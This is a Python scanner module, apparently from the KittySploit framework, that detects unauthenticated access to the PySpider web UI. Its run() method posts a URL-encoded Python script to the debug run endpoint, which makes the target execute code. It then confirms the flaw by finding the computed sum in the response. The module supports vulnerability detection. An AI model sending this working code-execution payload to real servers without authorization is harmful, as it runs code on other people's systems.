#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Unauthorized Access exists in PySpider which is an open-source web crawling and web scraping framework written."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Pyspider Unauthorized Access Detection',
        'description': 'Unauthorized Access exists in PySpider which is an open-source web crawling and web scraping framework written in Python.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'pyspider', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://github.com/ianxtianxt/Pyspider-webui-poc'],
    }

    def run(self):
        path = '/debug/pyspidervulntest/run'
        r = self.http_request(method='POST', path=path, allow_redirects=True, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='webdav_mode=false&script=from+pyspider.libs.base_handler+import+*%0Aclass+Handler(BaseHandler)%3A%0A++++def+on_start(self)%3A%0A++++++++print(str(452345672+%2B+567890765))&task=%7B%0A++%22process%22%3A+%7B%0A++++%22callback%22%3A+%22on_start%22%0A++%7D%2C%0A++%22project%22%3A+%22pyspidervulntest%22%2C%0A++%22taskid%22%3A+%22data%3A%2Con_start%22%2C%0A++%22url%22%3A+%22data%3A%2Con_start%22%0A%7D\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('1020236437',)
        if any(m in body for m in body_any):
            self.set_info(severity='high', reason='Pyspider Unauthorized Access detected', path=path)
            return True
        return False

